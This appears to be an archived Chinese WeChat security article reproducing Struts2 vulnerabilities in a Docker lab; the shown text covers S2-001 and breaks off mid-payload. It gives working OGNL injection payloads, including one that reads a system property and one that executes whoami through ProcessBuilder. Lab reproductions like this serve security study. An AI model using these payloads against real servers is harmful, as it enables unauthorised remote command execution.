<html>
<head>
<title>干货｜最全的Struts2漏洞复现</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
<style>
*{margin:0;padding:0;max-width:100%;box-sizing:border-box;}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;line-height:1.6}img{z-index:999;position:relative;max-width:100%;margin:10px 0;}body{-webkit-touch-callout:none;font family:-apple-system-font,BlinkMacSystemFont,"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei UI","Microsoft YaHei",Arial,sans-serif;color:#333;letter-spacing:.034em}h1,h2,h3,h4,h5,h6{font-weight:400;font-size:16px;line-height:36px;}a{color:#576b95;text-decoration:none;-webkit-tap-highlight-color:rgba(0,0,0,0)}td,th{word-wrap:break-word;padding:5px 10px;border:1px solid #DDD;}table{margin-bottom:10px;border-collapse:collapse;display:table;width:100%!important;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}.rich_media_area_primary{padding:20px 16px 12px;background-color:#fafafa}@media (max-width:375px){.rich_media_area_primary{padding:20px 60px 15px 60px}.rich_media_area_extra{padding:0 60px 21px 60px}}@media (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner,body{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media{padding:20px;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}@media screen and (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media_content{overflow:hidden;color:#333;font-size:17px;line-height:37px;;word-wrap:break-word;-webkit-hyphens:auto;-ms-hyphens:auto;hyphens:auto;text-align:justify;position:relative;z-index:0}.rich_media_content *{max-width:100%!important;box-sizing:border-box!important;-webkit-box-sizing:border-box!important;word-wrap:break-word!important}.rich_media_content p{clear:both;min-height:1em}.rich_media_content em{font-style:italic}.rich_media_content fieldset{min-width:0}.rich_media_content .list-paddingleft-1,.rich_media_content .list-paddingleft-2,.rich_media_content .list-paddingleft-3{padding-left:2.2em}.rich_media_content .list-paddingleft-1 .list-paddingleft-2,.rich_media_content .list-paddingleft-2 .list-paddingleft-2,.rich_media_content .list-paddingleft-3 .list-paddingleft-2{padding-left:30px}.rich_media_content .list-paddingleft-1{padding-left:1.2em}.rich_media_content .list-paddingleft-3{padding-left:3.2em}.rich_media_content .code-snippet,.rich_media_content .code-snippet__fix{max-width:1000%!important}.rich_media_content .code-snippet *,.rich_media_content .code-snippet__fix *{max-width:1000%!important}.rich_media_title{font-size:22px;line-height:42px;;line-height:1.4;margin:10px 0;padding-bottom:10px;border-bottom:1px solid #e7e7eb;}@supports(-webkit-overflow-scrolling:touch){.rich_media_title{font-weight:700}}.rich_media_meta{display:inline-block;vertical-align:middle;margin:0 10px 10px 0;font-size:15px;line-height:35px;;line-height:35px;;line-height:35px;;line-height:35px;;-webkit-tap-highlight-color:rgba(0,0,0,0)}.rich_media_meta.icon_appmsg_tag{margin-right:4px}.rich_media_meta.meta_tag_text{margin-right:0}.rich_media_meta_list em{font-style:normal}.rich_media_meta_text{color:rgba(0,0,0,0.3)}p{margin:0;}.msgBox{margin-top:20px;padding-top:20px;padding-left:50px;overflow:hidden;border-top:2px dashed #09a2ff;}.msg{padding-top:7px;clear:both;}.msgBody{float:right;width:100%;margin-left:55px;padding-bottom:15px;border-bottom:1px dashed #e0e0e0;}.userHeadImg{float:left;margin-left:-50px;}.userHeadImg img{width:40px;height:40px;margin-right:10px;border-radius:3px;}.userName{color:#888888;line-height:24px;font-size:14px;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;margin:5px 0 5px 0;height:24px;}.replyBody,.autherBody{color:#565656;font-size:15px;}.replyIcon{border-left:4px solid #33ab01;margin-right:5px;}.ad{text-decoration:none;color:#d6d4d4;font-size:12px;line-height:32px;;}.msgBodyReply{padding-top:5px;}.userName span{float:right;color:#afafaf;font-size:14px;}code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;}.code-snippet__fix{font-size:14px;margin:10px 0;display:block;color:#333;position:relative;background-color:rgba(0,0,0,0.03);border:1px solid #f0f0f0;border-radius:2px;display:-webkit-box;display:-webkit-flex;display:flex;padding-left:25px;line-height:26px}.code-snippet__fix code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;font family:Consolas,"Liberation Mono",Menlo,Courier,monospace}.code-snippet__comment,.code-snippet__quote{color:#afafaf;font-style:italic}.code-snippet__keyword,.code-snippet__selector-tag,.code-snippet__subst{color:#ca7d37}.code-snippet__number,.code-snippet__literal,.code-snippet__variable,.code-snippet__template-variable,.code-snippet__tag .code-snippet__attr{color:#0e9ce5}.code-snippet__string,.code-snippet__doctag{color:#d14}.code-snippet__title,.code-snippet__section,.code-snippet__selector-id{color:#d14}.code-snippet__subst{font-weight:normal}.code-snippet__type,.code-snippet__class .code-snippet__title{color:#0e9ce5}.code-snippet__tag,.code-snippet__name,.code-snippet__attribute{color:#0e9ce5;font-weight:normal}.code-snippet__regexp,.code-snippet__link{color:#ca7d37}.code-snippet__symbol,.code-snippet__bullet{color:#d14}.code-snippet__built_in,.code-snippet__builtin-name{color:#ca7d37}.code-snippet__meta{color:#afafaf}.code-snippet__deletion{background:#fdd}.code-snippet__addition{background:#dfd}.code-snippet__emphasis{font-style:italic}.code-snippet__strong{font-weight:bold}.account_avatar{width:40px;height:40px;padding:0;}.account_info{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;padding:20px 0;align-items:center}.flex_bd{padding-left:14px;}.account_nickname{display:inline-block;vertical-align:middle;line-height:1.2;color:#576b95;font-size:14px}.account_desc{overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:1;color:rgba(0,0,0,0.3);font-size:14px;line-height:1.2;padding-top:.4em}.msg_source_url{text-align:left;word-break:break-all;margin-top:20px;}.msg_source_url a{padding-right:10px;}.msg_source_url .url_text{color:#a8a8a8;}.video-desc{font-size:14px;margin-top:15px;color:#6c6c6c;}.msg_source_url{text-align:left;}.original_primary_card_tips{color:rgba(0,0,0,0.3);line-height:1.4;font-size:15px;}.weui-flex__item{margin-bottom:20px;padding:20px 16px;margin-top:16px;line-height:1.4;align-items:center;background-color:#f7f7f7;border-radius:8px;position:relative;}.original_primary_desc{color:rgba(0,0,0,0.5);font-size:14px;padding-top:4px;width:auto;overflow:hidden;text-overflow:ellipsis;}.msgBodyReplyList{border-top:1px solid #e1e1e1;margin-top:10px;}.msgBodyReplyListTop{border-top:0;}.reply_like_num{float:right;font-size:14px;color:#c7c7c7;}.msgData{margin-top:20px;color:#626262;}.msgData span{font-size:14px;padding-right:15px;}.msgData .likes{float:right;padding-right:0;}.js_text_content p{font-size:18px;line-height:38px;;}.rich_media_meta_link{font-size:15px;}blockquote {padding-left: 10px;border-left: 3px solid #dbdbdb;color: rgba(0,0,0,0.5);font-size:15px;line-height:35px;;padding-top: 4px;margin: 1em 0;}.video_iframe{width:500px;height:400px;}.blockquote_info{color:#b5b5b5;margin-top:10px;}.playVideoWx{position:relative;display:block;}.icon_mid_play{position:absolute;z-index:9999;top:50%;left:50%;display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;width:48px;height:48px;background:rgba(237,237,237,0.9);border-radius:50%}.icon_mid_play:before{content:"";text-indent:-999em;display:inline-block;width:28px;height:28px;vertical-align:middle;background-size:cover;background-image:url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E  %3Cpath fill='%23151515' fill-rule='evenodd' d='M9.524 4.938l10.092 6.21a1 1 0 0 1 0 1.704l-10.092 6.21A1 1 0 0 1 8 18.21V5.79a1 1 0 0 1 1.524-.852z'/%3E%3C/svg%3E")}
</style>
<link href="https://www.juyifx.cn/config/css/wxArticle.css" rel="stylesheet"/>
</head>
<body>
<div class="rich_media">
                
                <h1 class="rich_media_title" id="activity-name">
                    
                    
                    
干货｜最全的Struts2漏洞复现
                </h1>
                <div id="meta_content" class="rich_media_meta_list">
                                                                <span id="copyright_logo" class="rich_media_meta icon_appmsg_tag appmsg_title_tag weui-wa-hotarea">原创</span>
                                                                                            <span class="rich_media_meta rich_media_meta_text">
                                                                    mathwizard
                                                            </span>
                                                                
                                        <span class="rich_media_meta rich_media_meta_nickname" id="profileBt">
                      <a href="javascript:void(0);" class=" weui-wa-hotarea" id="js_name">
                        HACK学习呀                      </a>
                      <div id="js_profile_qrcode" class="profile_container" style="display:none;">
                          <div class="profile_inner">
                              <strong class="profile_nickname">HACK学习呀</strong>
                              

                              <p class="profile_meta">
                              <label class="profile_meta_label">微信号</label>
                              <span class="profile_meta_value">Hacker1961X</span>
                              </p>

                              <p class="profile_meta">
                              <label class="profile_meta_label">功能介绍</label>
                              <span class="profile_meta_value">HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！</span>
                              </p>
                              
                          </div>
                          <span class="profile_arrow_wrp" id="js_profile_arrow_wrp">
                              <i class="profile_arrow arrow_out"></i>
                              <i class="profile_arrow arrow_in"></i>
                          </span>
                      </div>
                    </span>
                    <em id="publish_time" class="rich_media_meta rich_media_meta_text">2021-08-24</em>
                </div>

                
                                                                                                                                                                            <div id="js_tags"  class="article-tag__list" data-len="2">
                                            
                        <div class="article-tag-card__title">收录于话题</div>
                        <div class="article-tags">
                                                                                                <div role="link" class="article-tag__item-wrp js_tag weui-wa-hotarea" data-url="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI5MDU1NDk2MA==&amp;action=getalbum&amp;album_id=2005408480857260033#wechat_redirect" data-tag_id="" data-album_id="2005408480857260033"  data-tag_source="4">
                                        <span class="article-tag__item"><span aria-hidden="true">#</span>java</span>
                                                                                    <span class="article-tag__item-num"><span class="weui-hidden_abs">,</span>2</span>
                                                                            </div>
                                                                    <div role="link" class="article-tag__item-wrp js_tag weui-wa-hotarea" data-url="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI5MDU1NDk2MA==&amp;action=getalbum&amp;album_id=2015334080048889856#wechat_redirect" data-tag_id="" data-album_id="2015334080048889856"  data-tag_source="1">
                                        <span class="article-tag__item"><span aria-hidden="true">#</span>Struts2</span>
                                                                                    <span class="article-tag__item-num"><span class="weui-hidden_abs">,</span>1</span>
                                                                            </div>
                                                                                    </div>
                                    </div><div id="weixin_content"><h1 style="margin-right: auto;margin-bottom: 1em;margin-left: auto;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 1em;padding-left: 1em;border-bottom: 2px solid rgb(15, 76, 129);" data-mpa-powered-by="yiban.io">简介</h1><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。Struts 2是Struts的下一代产品，是在 struts 1和WebWork的技术基础上进行了合并的全新的Struts 2框架。其全新的Struts 2的体系结构与Struts 1的体系结构差别巨大。Struts 2以WebWork为核心，采用拦截器的机制来处理用户的请求，这样的设计也使得业务逻辑控制器能够与ServletAPI完全脱离开，所以Struts 2可以理解为WebWork的更新产品。虽然从Struts 1到Struts 2有着非常大的变化，但是相对于WebWork，Struts 2的变化很小。</p><h1 style="margin: 2em auto 1em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 1em;padding-left: 1em;border-bottom: 2px solid rgb(15, 76, 129);">S2-001</h1><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">进入s2-001的docker漏洞环境</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.08960915157292659" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/1_p9f9zzUr1LkgicDAlRjuPabZrGHFCg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wibRK4LsTPiciaUwpf3ial0SuOFiaUzp9f9zzUr1LkgicDAlRjuPabZrGHFCg/640?wx_fmt=png'" data-type="png" data-w="1049" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">首先使用<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">%{'test'}</code>进行测试漏洞是否存在</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.640926640926641" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/2_KibHmMXSCvGSmdSxIyxWlZx6iav4ag.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5w5yYusfSocnl6WURCfcZpOibh5NrKibHmMXSCvGSmdSxIyxWlZx6iav4ag/640?wx_fmt=png'" data-type="png" data-w="518" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">返回了test，证明存在漏洞</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.6637630662020906" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/3_Do43aZSXoXZGWdvr8SABLQpsvX8AGA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wN04SfqI1ibRf6ico1U2IlZ1vI9Do43aZSXoXZGWdvr8SABLQpsvX8AGA/640?wx_fmt=png'" data-type="png" data-w="574" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">使用payload进行测试，返回了<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">tomcatBinDir{/usr/local/tomcat}</code></p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="java" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%{</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"tomcatBinDir{"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">+</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">@java</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">lang</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">System@getProperty</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"user.dir"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)+</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"}"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">}</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.6031468531468531" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/4_iaxiaicicWiaAJgFiaAuicia00RfaA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wz6UkEVic6kPBmQdjwKkNzc2eviberx6qhXiaxiaicicWiaAJgFiaAuicia00RfaA/640?wx_fmt=png'" data-type="png" data-w="572" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">使用payload执行whoami</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="java" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">%{#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">a</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">new</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> java</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">lang</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">ProcessBuilder</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">new</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> java</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">lang</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">String</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">[]{</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"whoami"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">})).</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">redirectErrorStream</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">true</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">).</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">start</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(),#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">b</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">a</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">getInputStream</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(),#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">c</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">new</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> java</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">io</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">InputStreamReader</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">b</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">),#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">d</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">new</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> java</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">io</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">BufferedReader</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">c</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">),#</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">e</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">new</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">char</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 